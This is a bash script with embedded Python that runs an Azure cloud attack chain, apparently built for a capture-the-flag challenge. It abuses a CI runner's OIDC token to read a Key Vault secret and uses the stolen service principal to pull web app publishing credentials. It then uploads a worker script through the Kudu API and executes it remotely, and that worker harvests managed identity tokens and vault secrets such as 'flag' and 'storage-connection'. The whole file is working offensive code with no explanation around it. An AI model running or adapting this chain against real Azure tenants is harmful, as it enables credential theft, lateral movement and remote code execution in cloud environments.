#!/usr/bin/env bash
set +e
python3 - <<'PY'
import base64,json,os,time,urllib.parse,urllib.request,urllib.error
TEN='3205c325-06a5-4171-9ce8-ffc5e6c2845e'; SUB='c5e4e004-b42d-4ac4-a502-5fd338380eb6'; CID='72ff278a-9e71-43ec-bac4-2ca303f8e462'; V='https://kv-tbl-prod-x3euoz.vault.azure.net'; APP='app-tbl-reporting-prod'; RG='rg-tbl-reporting-prod-eus'; ARM='https://management.azure.com'
def rq(u,m='GET',d=None,h=None,t=30):
 try:
  x=urllib.request.urlopen(urllib.request.Request(u,data=d,method=m,headers=h or {}),timeout=t); return x.status,x.read()
 except urllib.error.HTTPError as e:return e.code,e.read()
 except Exception as e:return 0,str(e).encode()
def jq(u,m='GET',o=None,tok='',t=30):
 h={'Content-Type':'application/json'}
 if tok:h['Authorization']='Bearer '+tok
 s,b=rq(u,m,json.dumps(o).encode() if o is not None else None,h,t)
 try:return s,json.loads(b.decode())
 except:return s,{'raw':b.decode(errors='replace')}
def fq(u,o,t=30):
 s,b=rq(u,'POST',urllib.parse.urlencode(o).encode(),{'Content-Type':'application/x-www-form-urlencoded'},t)
 try:return s,json.loads(b.decode())
 except:return s,{'raw':b.decode(errors='replace')}
base_oid=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL',''); raw_oid=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN',''); print('oidc_env',bool(base_oid),len(raw_oid),flush=True)
ou=base_oid+'&audience=api%3A%2F%2FAzureADTokenExchange'; s,b=rq(ou,h={'Authorization':'Bearer '+raw_oid}); print('oidc_req',s,b[:300],flush=True); oid=json.loads(b.decode()).get('value','') if s==200 else ''
s,d=fq(f'https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token',{'client_id':CID,'grant_type':'client_credentials','scope':'https://vault.azure.net/.default','client_assertion_type':'urn:ietf:params:oauth:client-assertion-type:jwt-bearer','client_assertion':oid}); vt=d.get('access_token',''); print('vault',len(vt),flush=True)
s,d=jq(V+'/secrets/reporting-service-principal?api-version=7.4',tok=vt); sp=json.loads(d.get('value','{}')) if d.get('value') else {}
s,d=fq(f'https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token',{'client_id':sp.get('appId',''),'grant_type':'client_credentials','client_secret':sp.get('clientSecret',''),'scope':'https://management.azure.com/.default'}); at=d.get('access_token',''); print('arm',len(at),flush=True)
u=f'{ARM}/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Web/sites/{APP}/restart?api-version=2023-01-01'; s,b=rq(u,'POST',b'',{'Authorization':'Bearer '+at},40); print('restart',s,b[:200],flush=True); time.sleep(12)
u=f'{ARM}/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Web/sites/{APP}/config/publishingcredentials/list?api-version=2023-01-01'; s,d=jq(u,'POST',{},at,40); p=d.get('properties',{}); ku=p.get('publishingUserName',''); kp=p.get('publishingPassword',''); print('pub',s,bool(ku),len(kp),flush=True)
if not ku or not kp: raise SystemExit
worker='''import os,json,urllib.parse,urllib.request,urllib.error\nIE=os.environ.get("IDENTITY_ENDPOINT","http://169.254.131.3:8081/msi/token"); IH=os.environ.get("IDENTITY_HEADER","")\ndef g(u,h={}):\n try:\n  r=urllib.request.urlopen(urllib.request.Request(u,headers=h),timeout=20); return r.status,r.read().decode(errors="replace")\n except urllib.error.HTTPError as e:return e.code,e.read().decode(errors="replace")\n except Exception as e:return 0,str(e)\nq=IE+"?resource="+urllib.parse.quote("https://vault.azure.net",safe="")+"&api-version=2019-08-01&client_id=7a85156a-01c4-4e61-8472-40a92107159b"; s,b=g(q,{"X-IDENTITY-HEADER":IH}); print("IDENTITY",s,b[:500])\ntry:t=json.loads(b)["access_token"]\nexcept:t=""\nfor n in ["flag","tbl-flag","config-storage-connection","storage-connection","internal-config"]:\n s,b=g("https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/"+n+"?api-version=7.4",{"Authorization":"Bearer "+t}); print("SECRET",n,s,b)\n+'''
worker=worker.replace('\\n+','\\n').replace('+','')
worker_lines=[
"import os,json,urllib.parse,urllib.request,urllib.error",
"IE=os.environ.get('IDENTITY_ENDPOINT','http://169.254.131.3:8081/msi/token'); IH=os.environ.get('IDENTITY_HEADER',''); OUT='/home/site/wwwroot/flag_result.txt'",
"def p(*x):",
" s=' '.join(map(str,x)); print(s,flush=True); open(OUT,'a').write(s+'\\n')",
"def g(u,h={}):",
" try:",
"  r=urllib.request.urlopen(urllib.request.Request(u,headers=h),timeout=3); return r.status,r.read().decode(errors='replace')",
" except urllib.error.HTTPError as e:return e.code,e.read().decode(errors='replace')",
" except Exception as e:return 0,str(e)",
"q=IE+'?resource='+urllib.parse.quote('https://vault.azure.net',safe='')+'&api-version=2019-08-01'",
"q+='&client_id=7a85156a-01c4-4e61-8472-40a92107159b'",
"s,b=g(q,{'X-IDENTITY-HEADER':IH}); p('IDENTITY',s,b[:500])",
"try:t=json.loads(b)['access_token']",
"except:t=''",
"for n in ['flag','tbl-flag','config-storage-connection','storage-connection','internal-config']:",
" s,b=g('https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/'+n+'?api-version=7.4',{'Authorization':'Bearer '+t}); p('SECRET',n,s,b)",
]
worker='\n'.join(worker_lines)
a=base64.b64encode((ku+':'+kp).encode()).decode(); u=f'https://{APP}.scm.azurewebsites.net/api/vfs/site/wwwroot/readflag.py'; s,b=rq(u,'PUT',worker.encode(),{'Authorization':'Basic '+a,'If-Match':'*'},40); print('vfs',s,b[:200],flush=True)
cmd=json.dumps({'command':'python3 /home/site/wwwroot/readflag.py','dir':'site/wwwroot'}).encode(); s,b=rq(f'https://{APP}.scm.azurewebsites.net/api/command','POST',cmd,{'Authorization':'Basic '+a,'Content-Type':'application/json'},60); print('command',s,b.decode(errors='replace'),flush=True)
PY
